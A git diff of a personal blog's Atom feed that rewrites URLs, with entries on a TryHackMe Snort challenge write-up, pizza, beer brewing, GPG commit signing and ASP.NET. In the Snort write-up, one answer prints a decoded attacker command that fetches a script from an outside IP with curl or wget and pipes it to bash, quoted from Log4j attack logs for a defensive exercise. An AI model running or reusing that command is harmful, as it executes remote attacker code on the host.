 &lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
 &lt;p&gt;What is the IP ID of the corresponding packet?&lt;/p&gt;
@@ -1132,7 +1132,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;62808 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-7-2"&gt;Question 7&lt;/h4&gt;
 &lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
 &lt;p&gt;Decode the encoded command.&lt;/p&gt;
@@ -1143,7 +1143,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-8"&gt;Question 8&lt;/h4&gt;
 &lt;p&gt;What is the CVSS v2 score of the Log4j vulnerability?&lt;/p&gt;
 &lt;h5 id="notes-26"&gt;Notes&lt;/h5&gt;
@@ -1152,7 +1152,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p&gt;9.3&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="conclusion"&gt;Conclusion&lt;/h3&gt;
 &lt;p&gt;Congratulations! Are you brave enough to stop a live attack in the &lt;a href="https://tryhackme.com/room/snortchallenges2"&gt;Snort2 Challenge 2&lt;/a&gt; room?&lt;/p&gt;
 &lt;p&gt;Check back soon for my write up of Snort Challenge 2.&lt;/p&gt;
@@ -1160,10 +1160,10 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 		<summary>&lt;p&gt;This is the first time I have written up a Try Hack Me challenge on day 161 of my hacking streak, it is primarily to keep track of the challenge as I work through it, if you find this, I hope it helps.&lt;/p&gt;</summary>
 	</entry>
 	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-05-09-pizza-party</id>
+		<id>https://blog.mark-burton.com/posts/2023-05-09-pizza-party</id>
 		<title>Pizza Party</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-05-09-pizza-party" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/PizzaInOoniKoda12.png" />
+		<link href="https://blog.mark-burton.com/posts/2023-05-09-pizza-party" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/assets/Images/PizzaInOoniKoda12.png" />
 		<updated>2023-05-07T15:23:12Z</updated>
 		<content>&lt;h1 id="pizza-party"&gt;Pizza Party!&lt;/h1&gt;
 &lt;h2 id="the-menu"&gt;The Menu&lt;/h2&gt;
@@ -1594,7 +1594,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
       &lt;div class="modal-body"&gt;
       &lt;h4&gt;Your QR code for entry&lt;/h4&gt;
       &lt;p&gt;The QR code contains your order&lt;/p&gt;
-      &lt;p&gt;You can also see your order confirmation &lt;a href="https://blog.mark-burton.com/mywyamblog/qr"&gt;here&lt;/a&gt;
+      &lt;p&gt;You can also see your order confirmation &lt;a href="https://blog.mark-burton.com/qr"&gt;here&lt;/a&gt;
         &lt;img src="https://blog.mark-burton.com/assets/Images/qr-code-hw.png" class="img-fluid"&gt;
       &lt;/p&gt;&lt;/div&gt;
       &lt;div class="modal-footer"&gt;
@@ -1606,10 +1606,10 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 		<summary>&lt;p&gt;All toppings subject to availability, for special requests contact me on Instagram&lt;/p&gt;</summary>
 	</entry>
 	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-04-22-brew-day</id>
+		<id>https://blog.mark-burton.com/posts/2023-04-22-brew-day</id>
 		<title>Brew Day</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-04-22-brew-day" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/milling.jpg" />
+		<link href="https://blog.mark-burton.com/posts/2023-04-22-brew-day" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/assets/Images/milling.jpg" />
 		<updated>2023-04-01T15:23:12Z</updated>
 		<content>&lt;h1 id="brew-day"&gt;Brew Day&lt;/h1&gt;
 &lt;p&gt;As a birthday present Christophe, the lead brewer at &lt;a href="https://untappd.com/chabrew"&gt;cha&lt;/a&gt;, gave me the chance to have my very own beer created.&lt;/p&gt;
@@ -1662,10 +1662,10 @@ video.
 		<summary>&lt;p&gt;As a birthday present Christophe, the lead brewer at &lt;a href="https://untappd.com/chabrew"&gt;cha&lt;/a&gt;, gave me the chance to have my very own beer created.&lt;/p&gt;</summary>
 	</entry>
 	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-01-20-signing-git-commits-in-vscode-and-visualstudio</id>
+		<id>https://blog.mark-burton.com/posts/2023-01-20-signing-git-commits-in-vscode-and-visualstudio</id>
 		<title>Signing Git Commits in VS Code and Visual Studio</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-01-20-signing-git-commits-in-vscode-and-visualstudio" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/VSCode_Sign_Commit.png" />
+		<link href="https://blog.mark-burton.com/posts/2023-01-20-signing-git-commits-in-vscode-and-visualstudio" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/assets/Images/VSCode_Sign_Commit.png" />
 		<updated>2023-01-17T15:23:12Z</updated>
 		<content>&lt;h1 id="singing-git-commits-in-vs-code-and-visual-studio"&gt;Singing git commits in VS Code and Visual Studio&lt;/h1&gt;
 &lt;h2 id="install-gnupg"&gt;Install GnuPG&lt;/h2&gt;
@@ -1738,7 +1738,7 @@ commit.gpgsign=true
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h2 id="usage-in-vs-code"&gt;Usage in VS Code&lt;/h2&gt;
 &lt;p&gt;Continue to use VS Code normally, when you do a commit you will be prompted for the passphrase for the gpg key.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://blog.mark-burton.com/mywyamblog/assets/images/VSCode_Sign_Commit.png" alt="gpg prompt in VS Code"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://blog.mark-burton.com/assets/images/VSCode_Sign_Commit.png" alt="gpg prompt in VS Code"&gt;&lt;/p&gt;
 &lt;h2 id="how-often-to-sign-the-commits"&gt;How often to sign the commits?&lt;/h2&gt;
 &lt;p&gt;Signing every commit can be tedious, the default cache time is 1800 seconds (30 minutes) as per the &lt;a href="https://www.gnupg.org/documentation/manuals/gnupg/Agent-Options.html"&gt;Agent Options documentation&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;Although this is not the same answer as running &lt;code&gt;gpgconf.exe --list-options gpg-agent&lt;/code&gt; which returns 600 seconds and is backed up by a local test.&lt;/p&gt;
@@ -1760,10 +1760,10 @@ ignore-cache-for-signing:8:0:do not use the PIN cache when signing:0:0::::
 		<summary>&lt;p&gt;&lt;code&gt;choco install gnupg&lt;/code&gt; or &lt;a href="https://gpg4win.org/get-gpg4win.html"&gt;https://gpg4win.org/get-gpg4win.html&lt;/a&gt;&lt;/p&gt;</summary>
 	</entry>
 	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2022-04-11-notes-from-addressing-pentest-results</id>
+		<id>https://blog.mark-burton.com/posts/2022-04-11-notes-from-addressing-pentest-results</id>
 		<title>Notes From Addressing Penetration Test Findings</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2022-04-11-notes-from-addressing-pentest-results" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/PizzaInOoniKoda12.png" />
+		<link href="https://blog.mark-burton.com/posts/2022-04-11-notes-from-addressing-pentest-results" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/assets/Images/PizzaInOoniKoda12.png" />
 		<updated>2022-04-11T15:23:12Z</updated>
 		<content>&lt;h1 id="understanding-penetration-test-reports-as-a-developer"&gt;Understanding Penetration Test Reports as a developer&lt;/h1&gt;
 &lt;p&gt;In the Pentest reports I have read it has been common for the first section to be about identifying the technology the application is written in, this is used to make some initial suggestions on shortcomings in the application.&lt;/p&gt;
@@ -1842,10 +1842,10 @@ HighentropyVA    : N/A
 		<summary>&lt;p&gt;In the Pentest reports I have read it has been common for the first section to be about identifying the technology the application is written in, this is used to make some initial suggestions on shortcomings in the application.&lt;/p&gt;</summary>
 	</entry>
 	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2021-12-20-create-a-custom-userstore-net6</id>
+		<id>https://blog.mark-burton.com/posts/2021-12-20-create-a-custom-userstore-net6</id>
 		<title>How To Create a Custom UserStore in ASP.NET Core 6</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2021-12-20-create-a-custom-userstore-net6" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/PizzaInOoniKoda12.png" />
+		<link href="https://blog.mark-burton.com/posts/2021-12-20-create-a-custom-userstore-net6" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/assets/Images/PizzaInOoniKoda12.png" />
 		<updated>2021-12-20T15:23:12Z</updated>
 		<content>&lt;h1 id="customer-userstore"&gt;Customer UserStore&lt;/h1&gt;
 &lt;pre&gt;&lt;code class="language-c#"&gt;builder.Services.AddDbContext&amp;lt;ApplicationDbContext&amp;gt;(options =&amp;gt;
@@ -1863,10 +1863,10 @@ builder.Services.AddTransient&amp;lt;IUserStore&amp;lt;ApplicationUser&amp;gt;, 
 		<summary>&lt;p&gt;&lt;a href="https://docs.microsoft.com/en-us/aspnet/core/security/authentication/identity-custom-storage-providers?view=aspnetcore-6.0"&gt;https://docs.microsoft.com/en-us/aspnet/core/security/authentication/identity-custom-storage-providers?view=aspnetcore-6.0&lt;/a&gt;&lt;/p&gt;</summary>
 	</entry>
 	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2021-07-09-making-pizza-in-my-ooni-koda-12</id>
+		<id>https://blog.mark-burton.com/posts/2021-07-09-making-pizza-in-my-ooni-koda-12</id>
 		<title>Making pizza in my Ooni Koda 12</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2021-07-09-making-pizza-in-my-ooni-koda-12" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/PizzaInOoniKoda12.png" />
+		<link href="https://blog.mark-burton.com/posts/2021-07-09-making-pizza-in-my-ooni-koda-12" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/assets/Images/PizzaInOoniKoda12.png" />
 		<updated>2021-07-08T15:23:12Z</updated>
 		<content>&lt;p&gt;I love pizza but nothing you can buy from the shop comes close to freshly made pizza and delivery is usually getting cold by the time it arrives.&lt;/p&gt;
 &lt;p&gt;Luckily for Christmas I received an Ooni Koda 12 (Thanks Caitriona), just connect the bottle of gas turn it on and after 15 minutes you have a 400°C oven ready to cook a pizza in only 90 seconds.&lt;/p&gt;
